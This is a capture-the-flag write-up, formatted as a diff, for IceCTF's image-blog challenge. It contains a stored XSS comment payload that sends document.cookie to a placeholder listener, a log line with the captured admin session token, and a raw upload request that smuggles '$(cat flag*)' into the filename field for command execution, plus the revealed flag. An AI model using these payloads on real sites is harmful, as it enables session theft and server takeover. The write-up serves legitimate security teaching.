@@ -1,0 +1,40 @@
+We upload as the comment the following content and after running the python web
+server, we report our submission:
+
+<script>image=new Image();image.src='http://a.b.c.d:40001/?'+document.cookie;</script>
+
+On your server:
+$ python -m SimpleHTTPServer 40001
+104.154.248.13 - - [21/Aug/2016 11:15:38] "GET /?session=eyJ1c2VyIjoxfQ.CpsCuQ.AUAilqsdTNUHB0J29udBmXyF33E HTTP/1.1" 200 -
+
+After we set the admin cookie, we can use upload functionality and inject
+arbitrary command to the filename parameter.
+
+Remote code execution:
+--
+POST /upload HTTP/1.1
+Host: imgblog.vuln.icec.tf
+Cookie: session=eyJ1c2VyIjoxfQ.CpsCuQ.AUAilqsdTNUHB0J29udBmXyF33E
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------2004428613855728202525907055
+Content-Length: 466
+
+-----------------------------2004428613855728202525907055
+Content-Disposition: form-data; name="title"
+
+whatever
+-----------------------------2004428613855728202525907055
+Content-Disposition: form-data; name="image"; filename="$(cat flag*)"
+Content-Type: image/jpeg
+
+whatever
+-----------------------------2004428613855728202525907055
+Content-Disposition: form-data; name="blogtext"
+
+whatever
+-----------------------------2004428613855728202525907055--
+
+Finally we can read the flag in the response:
+<div class="error">
+                    File is not an image:
+/uploads/IceCTF{why_would_you_use_shell_commands_in_your_web_app_plz_stop}: cannot open `/uploads/IceCTF{why_would_you_use_shell_commands_in_your_web_app_plz_stop}&#39; (No such file or directory)
